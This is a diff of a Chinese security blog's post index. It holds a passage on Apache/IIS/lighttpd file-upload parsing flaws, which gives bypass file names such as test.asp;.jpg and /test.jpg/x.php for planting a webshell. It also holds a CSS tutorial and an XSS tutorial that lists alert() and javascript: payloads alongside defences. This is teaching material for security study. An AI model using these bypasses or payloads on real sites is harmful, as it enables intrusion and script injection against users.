+<h3 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h3><p>在文件后缀后加上<code>%0a</code>，绕过getshell</p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置 <code>Options +Indexes</code> 时Apache存在目录遍历漏洞。</p>
+<h3 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h3><p><code>xx.jpg/xx.php</code></p>
+<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="解析目录解析漏洞-test-asp-1-jpg"><a href="#解析目录解析漏洞-test-asp-1-jpg" class="headerlink" title="解析目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)"></a>解析目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)</h3><p>在 IIS5.x&#x2F;6.0 中，在网站下建立文件夹的名字为<code>*.asp、*.asa、*.cer、*.cdx </code>的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p>
+<h3 id="文件名解析漏洞-test-asp-jpg"><a href="#文件名解析漏洞-test-asp-jpg" class="headerlink" title="文件名解析漏洞(test.asp;.jpg)"></a>文件名解析漏洞(test.asp;.jpg)</h3><p>在 IIS5.x&#x2F;6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 <code>.asa  .cer</code> 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <code>*.asp;.jpg、*.asa;.jpg、*.cer;.jpg</code> 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p>
+<h3 id="畸形解析漏洞-test-jpg-php"><a href="#畸形解析漏洞-test-jpg-php" class="headerlink" title="畸形解析漏洞(test.jpg&#x2F;*.php)"></a>畸形解析漏洞(test.jpg&#x2F;*.php)</h3><p>微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5</p>
+<p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p>
+<p> <a href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194604304-1865593941.png"><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1964477-20200308194604304-1865593941.png" alt="img"></a></p>
+<p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为&#x2F;upload，上传成功后，直接访问&#x2F;upload&#x2F;test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 &#x2F;upload 目录下创建了一个一句话木马文件<code> shell.php</code> 。</p>
+<p>临时解决办法：设置<code> cgi.fix_pathinfo</code>为0&#96;</p>
+<h3 id="其他解析漏洞"><a href="#其他解析漏洞" class="headerlink" title="其他解析漏洞"></a><strong>其他解析漏洞</strong></h3><p>在windows环境下，**xx.jpg[**<strong>空格]</strong> 或 <strong>xx.jpg.</strong> 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除。</p>
+<p>同时推荐一篇比较有意思的文章，lz自己没怎么看懂，但是感觉蛮有意思的</p>
+<p><a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！ | 长亭百川云</a></p>
+]]></content>
+      <tags>
+        <tag>-CTF -Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>智能合约深度学习（持续施工ing）</title>
     <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
     <content><![CDATA[<blockquote>
@@ -7666,110 +7599,6 @@ conversions = &#123;
       </categories>
       <tags>
         <tag>智能合约</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深度学习网页前端之CSS</title>
-    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
-    <content><![CDATA[<h1 id="深度学习网页前端之CSS"><a href="#深度学习网页前端之CSS" class="headerlink" title="深度学习网页前端之CSS"></a>深度学习网页前端之CSS</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>你如果问我CSS是什么<del>CSS就是CSS啊</del></p>
-<p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p>
-<p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
-<h2 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h2><p>CSS由两个主要的部分构成:</p>
-<ul>
-<li>选择器 &#x2F;&#x2F;需要改变样式的HTML元素</li>
-<li>一条或多条说明 &#x2F;&#x2F;每给说明&#x3D;1个属性+1个值</li>
-</ul>
-<p>每个属性有一个值。属性和值被冒号分开</p>
-<p>一般都放在head部分的style里</p>
-<p>大概长这个样子</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
-<p>css的注释使用经典的&#x2F;* *&#x2F;</p>
-<h2 id="对于多模块的处理"><a href="#对于多模块的处理" class="headerlink" title="对于多模块的处理"></a>对于多模块的处理</h2><p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p>
-<h3 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h3><p>在{}前加上<code>#[选择器名字]</code></p>
-<p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p>
-<p>这样就大功告成了</p>
-<blockquote>
-<p>[!IMPORTANT]</p>
-<p>ID属性不要以数字开头，数字开头的ID在 Mozilla&#x2F;Firefox 浏览器中不起作用</p>
-</blockquote>
-<h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p>
-<p>head部分:.</p>
-<pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;
-属性与值
-&#125;</code></pre>
-
-<p>body部分: </p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;
-
-&lt;/<span class="selector-tag">div</span>&gt;</code></pre>
-
-<h2 id="CSS的插入"><a href="#CSS的插入" class="headerlink" title="CSS的插入"></a>CSS的插入</h2><p>CSS的插入方式有三种</p>
-<ul>
-<li>外部样式表</li>
-<li>内部样式表</li>
-<li>内联样式</li>
-</ul>
-<h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>就和图片差不多，从服务器的目录下引入样式表</p>
-<pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span>
-<span class="tag">&lt;<span class="name">head</span>&gt;</span>
-<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-
-<pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>
-hr &#123;<span class="attribute">color</span>:sienna;&#125;
-<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
-<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>
-
-<p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p>
-<blockquote>
-<p>用作外部表的CSS文件不能包含任何的 html 标签</p>
-</blockquote>
-<p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p>
-<h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>单个文档需要特殊样式时，就使用内部样式表：</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
-<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
-<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
-<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
-<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
-<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-
-<h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p>
-<p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
-
-<h3 id="样式的继承"><a href="#样式的继承" class="headerlink" title="样式的继承"></a>样式的继承</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。 </p>
-<p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p>
-<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>
-
-<p>而内部样式表拥有针对 h3 选择器的两个属性：</p>
-<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>
-
-<p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p>
-<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>
-
-<p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p>
-<hr>
-<p>样式的优先级为:</p>
-<p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p>
-<blockquote>
-<p><strong>注意：</strong>如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p>
-</blockquote>
-<h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><h3 id="Backgrounds"><a href="#Backgrounds" class="headerlink" title="Backgrounds"></a>Backgrounds</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color:"></a>background-color:</h4><ul>
-<li>页面: body{background-color: }</li>
-<li>正文: p{background-color:}</li>
-<li>标题: h1{background-color: }</li>
-<li>指定模块: div{background-color:}</li>
-</ul>
-<h4 id="backgound-image"><a href="#backgound-image" class="headerlink" title="backgound-image"></a>backgound-image</h4><p>描述了元素的背景图像</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>
-
-]]></content>
-      <tags>
-        <tag>-Web前端 -CSS</tag>
       </tags>
   </entry>
   <entry>
@@ -9028,6 +8857,364 @@ $</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>深度学习网页前端之CSS</title>
+    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
+    <content><![CDATA[<h1 id="深度学习网页前端之CSS"><a href="#深度学习网页前端之CSS" class="headerlink" title="深度学习网页前端之CSS"></a>深度学习网页前端之CSS</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>你如果问我CSS是什么<del>CSS就是CSS啊</del></p>
+<p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p>
+<p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
+<h2 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h2><p>CSS由两个主要的部分构成:</p>
+<ul>
+<li>选择器 &#x2F;&#x2F;需要改变样式的HTML元素</li>
+<li>一条或多条说明 &#x2F;&#x2F;每给说明&#x3D;1个属性+1个值</li>
+</ul>
+<p>每个属性有一个值。属性和值被冒号分开</p>
+<p>一般都放在head部分的style里</p>
+<p>大概长这个样子</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
+<p>css的注释使用经典的&#x2F;* *&#x2F;</p>
+<h2 id="对于多模块的处理"><a href="#对于多模块的处理" class="headerlink" title="对于多模块的处理"></a>对于多模块的处理</h2><p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p>
+<h3 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h3><p>在{}前加上<code>#[选择器名字]</code></p>
+<p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p>
+<p>这样就大功告成了</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>ID属性不要以数字开头，数字开头的ID在 Mozilla&#x2F;Firefox 浏览器中不起作用</p>
+</blockquote>
+<h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p>
+<p>head部分:.</p>
+<pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;
+属性与值
+&#125;</code></pre>
+
+<p>body部分: </p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;
+
+&lt;/<span class="selector-tag">div</span>&gt;</code></pre>
+
+<h2 id="CSS的插入"><a href="#CSS的插入" class="headerlink" title="CSS的插入"></a>CSS的插入</h2><p>CSS的插入方式有三种</p>
+<ul>
+<li>外部样式表</li>
+<li>内部样式表</li>
+<li>内联样式</li>
+</ul>
+<h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>就和图片差不多，从服务器的目录下引入样式表</p>
+<pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span>
+<span class="tag">&lt;<span class="name">head</span>&gt;</span>
+<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+
+<pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>
+hr &#123;<span class="attribute">color</span>:sienna;&#125;
+<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
+<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>
+
+<p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p>
+<blockquote>
+<p>用作外部表的CSS文件不能包含任何的 html 标签</p>
+</blockquote>
+<p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p>
+<h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>单个文档需要特殊样式时，就使用内部样式表：</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
+<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
+<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
+<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
+<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
+<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+
+<h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p>
+<p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
+
+<h3 id="样式的继承"><a href="#样式的继承" class="headerlink" title="样式的继承"></a>样式的继承</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。 </p>
+<p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p>
+<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>
+
+<p>而内部样式表拥有针对 h3 选择器的两个属性：</p>
+<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>
+
+<p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p>
+<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>
+
+<p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p>
+<hr>
+<p>样式的优先级为:</p>
+<p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p>
+<blockquote>
+<p><strong>注意：</strong>如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p>
+</blockquote>
+<h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><h3 id="Backgrounds"><a href="#Backgrounds" class="headerlink" title="Backgrounds"></a>Backgrounds</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color:"></a>background-color:</h4><ul>
+<li>页面: body{background-color: }</li>
+<li>正文: p{background-color:}</li>
+<li>标题: h1{background-color: }</li>
+<li>指定模块: div{background-color:}</li>
+</ul>
+<h4 id="backgound-image"><a href="#backgound-image" class="headerlink" title="backgound-image"></a>backgound-image</h4><p>描述了元素的背景图像</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>
+
+]]></content>
+      <tags>
+        <tag>-Web前端 -CSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>详解XSS注入</title>
+    <url>/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><pre><code class="highlight plaintext">&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;
+
+&quot;byd被我注入了吧&quot;</code></pre>
+
+<h2 id="认识XSS攻击"><a href="#认识XSS攻击" class="headerlink" title="认识XSS攻击"></a>认识XSS攻击</h2><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
+<ul>
+<li><p>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。（通过在html标准的语句后触发事件，而事件则是执行恶意js</p>
+<p>代码）</p>
+</li>
+</ul>
+<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
+<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><pre><code class="highlight plaintext">又称**非持久型XSS**。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。
+
+攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。
+
+非持久型 XSS 漏洞攻击的**四大特点**：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。
+
+防止出现非持久型 XSS 漏洞的**五大措施**：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码</code></pre>
+
+<p>反射型 XSS 的 Payload 如下</p>
+<pre><code class="highlight plaintext">&lt;script&gt;alert(1)&lt;script&gt;</code></pre>
+
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul>
+<li>“&gt;闭合绕过</li>
+</ul>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><pre><code class="highlight plaintext">存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。
+
+一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。
+
+这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。
+
+可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。
+
+持久型 XSS 的三**大特点**：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。
+
+防止持久型 XSS 漏洞的**三大措施：** ①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</code></pre>
+
+
+
+<h2 id="DOM-based-型"><a href="#DOM-based-型" class="headerlink" title="DOM-based 型"></a>DOM-based 型</h2><pre><code class="highlight plaintext">客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 [DOM-based XSS](https://zhida.zhihu.com/search?content_id=164263694&amp;content_type=Article&amp;match_order=1&amp;q=DOM-based+XSS&amp;zhida_source=entity) 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</code></pre>
+
+
+
+<h2 id="基于字符集的-XSS"><a href="#基于字符集的-XSS" class="headerlink" title="基于字符集的 XSS"></a>基于字符集的 XSS</h2><pre><code class="highlight plaintext">哪怕现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。
+
+可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。
+
+避免基于字符集的 XSS 攻击的**两大方法：**①记住指定 &lt;meta charset=&quot;utf-8&quot;&gt;；② XML 中不仅要指定字符集为 utf-8，而且标签要闭合。</code></pre>
+
+
+
+<h2 id="基于-Flash-的跨站-XSS"><a href="#基于-Flash-的跨站-XSS" class="headerlink" title="基于 Flash 的跨站 XSS"></a>基于 Flash 的跨站 XSS</h2><pre><code class="highlight plaintext">基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。
+
+基于 Flash 的跨站 XSS 的**两种避免方法** **：**①严格管理 cookie 的读写权限；②对 Flash 能接受用户输入的参数进行过滤 escape 转义处理。</code></pre>
+
+
+
+<h2 id="未经验证的跳转-XSS"><a href="#未经验证的跳转-XSS" class="headerlink" title="未经验证的跳转 XSS"></a>未经验证的跳转 XSS</h2><pre><code class="highlight plaintext">有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。
+
+防止未经验证的跳转 XSS漏洞的**两种措施：**①对待跳转的 URL 参数做白名单或者某种规则过滤；②后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</code></pre>
+
+<h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h2 id="常用标签语句"><a href="#常用标签语句" class="headerlink" title="常用标签语句"></a>常用标签语句</h2><h3 id><a href="#" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h3><p>哈哈，经典款，鉴定为第一个过滤的</p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
+&lt;script&gt;alert(/xss/)&lt;/script&gt;
+&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</code></pre>
+
+<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>也是经典款(指html里面)</p>
+<p>元素内部构造:</p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span>
